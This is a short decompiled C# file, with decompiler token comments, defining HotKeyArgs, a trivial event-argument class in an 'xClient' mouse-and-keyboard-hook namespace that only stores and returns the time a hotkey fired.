using System;

namespace xClient.Core.MouseKeyHook.HotKeys
{
	// Token: 0x02000052 RID: 82
	public sealed class HotKeyArgs : EventArgs
	{
		// Token: 0x06000213 RID: 531 RVA: 0x00002FAE File Offset: 0x000011AE
		public HotKeyArgs(DateTime triggeredAt)
		{
			this.m_TimeOfExecution = triggeredAt;
		}

		// Token: 0x17000050 RID: 80
		// (get) Token: 0x06000214 RID: 532 RVA: 0x00002FBD File Offset: 0x000011BD
		public DateTime Time
		{
			get
			{
				return this.m_TimeOfExecution;
			}
		}

		// Token: 0x040000EB RID: 235
		private readonly DateTime m_TimeOfExecution;
	}
}
